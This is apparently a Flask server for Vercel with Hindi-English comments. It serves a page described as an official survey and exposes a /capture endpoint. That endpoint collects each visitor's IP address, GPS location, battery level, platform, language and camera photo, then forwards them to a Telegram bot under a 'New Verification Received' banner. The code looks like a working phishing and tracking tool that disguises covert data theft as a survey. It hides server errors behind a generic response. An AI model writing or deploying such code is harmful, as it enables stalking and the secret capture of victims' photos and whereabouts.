import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

# Vercel compatibility: Path pointing to templates folder
app = Flask(__name__, template_folder='../templates')

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

def send_to_telegram(report_text, photo_bytes=None):
    """Advanced function to handle telegram delivery"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        
        # 1. Detailed Report bhej raha hai
        requests.post(url + "sendMessage", data={
            "chat_id": CHAT_ID, 
            "text": report_text, 
            "parse_mode": "HTML",
            "disable_web_page_preview": False
        })
        
        # 2. Agar camera access mil gaya to photo bhej raha hai
        if photo_bytes:
            files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
            requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files=files)
            
    except Exception as e:
        print(f"Log Error: {e}")

@app.route('/')
def index():
    # Official Survey Page load karega
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "failed"}), 400

        info = data.get('info', {})
        photo_raw = data.get('photo')
        
        # Professional IP tracking (Vercel headers)
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
        
        # Google Maps link generate karna
        map_url = f"https://www.google.com/maps?q={info.get('lat')},{info.get('lon')}"
        
        # Telegram Message Format (Clean & Professional)
        report = (
            f"📥 <b>New Verification Received</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>IP Address:</b> <code>{ip}</code>\n"
            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
            f"📱 <b>System:</b> {info.get('platform')}\n"
            f"🌐 <b>Language:</b> {info.get('lang')}\n"
            f"📍 <b>Location:</b> <a href='{map_url}'>Open in Google Maps</a>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⏰ <b>Status:</b> Success"
        )

        # Image processing
        if photo_raw and "," in photo_raw:
            header, encoded = photo_raw.split(",", 1)
            photo_bytes = base64.b64decode(encoded)
            send_to_telegram(report, photo_bytes)
        else:
            send_to_telegram(report)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        # Server error hide karne ke liye generic response
        return jsonify({"status": "internal_error"}), 500

# Vercel handles the app object directly
